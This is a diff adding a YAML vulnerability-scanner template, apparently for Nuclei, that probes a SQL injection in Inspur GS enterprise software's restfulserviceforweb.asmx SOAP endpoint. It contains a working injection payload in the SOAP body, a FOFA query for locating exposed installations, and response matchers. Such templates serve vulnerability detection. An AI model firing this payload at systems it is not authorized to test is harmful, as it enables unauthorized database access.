@@ -1,0 +1,50 @@
+id: inspur-gs-restfulservice-sqli
+
+info:
+  name: 浪潮GS restfulserviceforweb.asmx SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    浪潮GS企业管理软件的restfulserviceforweb.asmx接口存在SQL注入漏洞，攻击者可通过Parameter参数执行布尔盲注
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'body="cwbase/web/scripts/aes.js" || title="GS企业管理软件" || body="weblogin/index.aspx"'
+  tags: INSPUR-浪潮GS企业管理软件
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/GSPIDM/gsp/webservice/restfulwebservice/restfulserviceforweb.asmx"
+    headers:
+      Content-Type: application/soap+xml; charset=utf-8
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.1617.9 Safari/537.36
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                      xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                      xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
+        <soap12:Body>
+          <Get xmlns="http://tempuri.org/">
+            <Resource>AuthDataModify</Resource>
+            <Parameter>
+              <ArrayOfString>
+                <string>id</string>
+                <string>admin' AND 7707 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT(CASE WHEN (7707=7707) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(113)))--xMuK</string>
+              </ArrayOfString>
+              <ArrayOfString>
+                <string>location</string>
+                <string>0</string>
+              </ArrayOfString>
+            </Parameter>
+          </Get>
+        </soap12:Body>
+      </soap12:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qjvqq1qjqkq"  # 布尔盲注成功时的特定回显
+        part: body
+      - type: status
+        status:
+          - 500
